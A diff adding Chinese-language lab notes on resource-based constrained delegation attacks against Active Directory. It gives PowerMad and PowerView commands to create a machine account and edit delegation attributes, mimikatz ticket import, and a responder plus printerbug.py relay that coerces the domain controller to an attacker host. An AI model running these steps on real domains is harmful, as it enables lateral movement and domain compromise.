@@ -1,0 +1,145 @@
+#  资源委派
+
+  配置的高级功能  windows2012以上
+
+攻击条件：A机器的msDS-AllowedToActOnBehalfOfOtherIdentity属性的    sid值对应B用户或者机器     这时候B就可以控制A。		msDS-AllowedToActOnBehalfOfOtherIdentity属性为ServiceA，也就允许ServiceA利用s4u2self协议代表其他用户身份来访问data的话，那我们就可以做到横向移动及提权等操作。
+
+ 在机器上操作         sid值都不同
+
+![1733582509627](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942251.png)
+
+  退域在加域。下面这种不符合资源约束委派（第一种）的攻击条件:
+
+![1733582926038](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942252.png)
+
+#### 利用
+
+先看sid值是否相同（1），不同再看是否在ao组（2），最后再看（3）
+
+资源约束委派利用分类：
+
+1、通过管理主机加入域的用户拿下主机
+
+2、已知Acount Operators组用户拿下主机
+
+3、结合HTLM Relay攻击拿下主机（CVE-2019-1040）
+
+#### 1 利用管理主机
+
+条件：
+
+1、允许创建机器账户
+
+2、具有管理主机加入域的用户账户。也就是说sid值要相同，一个是被控机sid和目标机sid值相同，这样才能控制目标机
+
+ 前面翻车，换域，god.org 成功在sql机上查询被域用户创建的机器账户列表。条件是需要都是同一个sid值，查到后可以看当前被控机的用户可以通过sid资源委派还能控制哪些机器。
+
+符合利用条件----查询被域用户创建的机器账户列表:：
+
+![1733584843470](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942253.png)
+
+  将test7用户加入到win8和Win7的sid控制，这里环境就是win7机器是test7用户 ，win8是datax用户，查询他俩的sid值相同，查询sid对应的用户为test7用户。两个机器都是用test7用户加入域。-----------重新梳理：win7-----test7机器（这里的机器是在域里面的机器名字）-----  test7用户加入域。     win2008(win8)-----datax机器--------test7用户加入域
+
+满足了攻击条件，sid值相同，并且sid对应的用户为被控机用户。就可以借助被控机（win7）来控制（资源委派）另一个机器(win8)
+
+本地是windows7-------xdpc(用户)----test7 （域内机器名）     win10-----xdpc(用户)------datax（域内机器名）
+
+![1733585052719](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942254.png)
+
+收集信息：
+
+![1733644904364](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942255.png)
+
+查找相同的sid用户-----xdpc：
+
+![1733585149490](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942256.png)
+
+环境问题，被控机不出网，还是在本地演示，就不在c2服务器上演示了，说明意思即可(信息收集就不演示了)。----    被控机为win10，sid符合当前攻击条件且被控机用户刚好也是sid值相同的用户：
+
+​     	开始利用，3个方案 ：addcpmputer（需要明文）  bloodyad（需要明文）  												powermad(不需要明文)不过需要上传文件（推荐使用这个）。上传的是自己powershell的模块，用来创建一个新用户(xiaodiA)，然后再用另一个模板来获取新增用户的sid值，最后用命令来修改目标主机data的委派属性sid修改成新建用户的，修改成自己新建的用户来资源委派控制data机。也就是datax机器的msDS-AllowedToActOnBehalfOfOtherIdentity属性sid值修改成自己新建的用户sid值。 
+
+这里为什么要新建一个用户来继而控制data机呢？为什么不直接用被控机test7来控制：													因为后续的攻击需要被控机的明文密码等条件，如果这里被控机明文密码不知道，那就无法进行后续，而新建的用户密码是知道的。
+
+使用PowerMad工具创建机器账户（脚本工具先上传上去）新建用户成功：
+
+![1733645688943](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942257.png)
+
+获取新增的xiaodiA的sid值--powershell Import-Module .\PowerView.ps1;Get-NetComputer xiaodiA -Properties objectsid  ：
+
+![1733646005585](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942258.png)
+
+下来就是将xiaodiA的sid值委派给datax，这样xiaodiA就成datax的领导-----先看这里datax是没有设置“领导”：
+
+![1733646113271](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942259.png)
+
+修改datax的领导值为xiaodiA的sid值  (小翻车------这里需要将powershell提到管理员权限，否则执行不了会报错，下来就是执行成功)：
+
+![1733646943159](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942260.png)
+
+  用新建的(xiaodiA)连接被控机，连接工具为im工具箱里的py工具，还是socks代理，然后本地连接。下来就是利用xiaodiA生成连接票据，在导入，利用。
+
+利用xiaodiA申请访问datax主机cifs服务票据------这里环境问题就在本地演示了-----正常应该socks代理然后py生成票据，将票据上传目标机后用mimikate导入利用：
+
+![1733648960340](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942261.png)
+
+导入票据到内存：
+
+![1733649148733](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942262.png)
+
+连接利用票据：-----------小插曲，弄错了搞反了：这里的win10被控机是datax机器，而目标Win7是test7用户，test计算机。所有前面一样，需要更改一些：
+
+修改datax主机委派属性时候将目标改为test7（刚才是datax）,cifs服务票据里面也改test7为目标
+
+![1733653257904](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942263.png)
+
+![1733653314396](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942264.png)
+
+然后还有注意都是管理员权限，powershell也是-------导入票据到内存（不需要在命令行中继续包含 `mimikatz` 命令，直接敲命令就行）--------连接利用票据：
+
+![1733653450332](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942265.png)
+
+这里连接也是在管理员的窗口运行（已踩坑）
+
+![1733653571986](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942266.png)
+
+#### 2 利用AO组
+
+1h07第二种工具的环境配置：win7----webadmin（机器名----在域里面的名字）----webadmin用户加入域     win2008-----datax-----test7用户加入域 。
+
+win10------webadmin------webadmin           windows7-------xdpc(用户)----test7
+
+![1733653890223](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942267.png)
+
+
+
+![1733656214337](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942268.png)
+
+
+
+ 条件：被控用户属于Acount Operators组的用户账户,因为这组里面的成员可修改域内任意主机的msDS-AllowedToActOnBehalfOfOtherIdentity属性。(除DC)，然后这里查询当前后发现被控机用户刚好在这组内。下面思路基本一样，添加xiaodiB用户，获取sid值。代理，获取票据，导入，建立连接
+
+加ao组后：
+
+![1733656511526](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942269.png)
+
+将webadmin加入ao组前后前使用查看命令------判断有没有利用条件：
+
+![1733656735966](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942270.png)
+
+此时ao组成员webadmin刚好为被控机，所以可以利用，后续和前面一样，主要就是要有能创建用户的权限。能执行第一步：使用PowerMad工具创建机器账户powershell Import-Module .\Powermad.ps1;New-MachineAccount -MachineAccount serviceA -Password $(ConvertTo-SecureString "123456" -AsPlainText -Force) ，后面一样
+
+#### 3：HTLM Relay
+
+结合HTLM Relay攻击。利用漏洞
+
+1、能创建机器账户
+
+2、目标开启打印机服务
+
+ 翻车~      kali监听，然后利用打印机漏洞让DC强制访问被控机，得到hash。后面利用hash生成票据。。。。
+
+条件：
+
+![1733661927163](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942271.png)
+
+这里是使用ntlmrelayx工具responder -I eth1 -wd进行监听，但是需要代理，因为要在同一个网段里才能监听到，然后用  python printerbug.py xiaodi.local/webadmin:admin!@#45@(DCip)   (kali ip )  ,强制让kali访问监听的得到DC的hash，
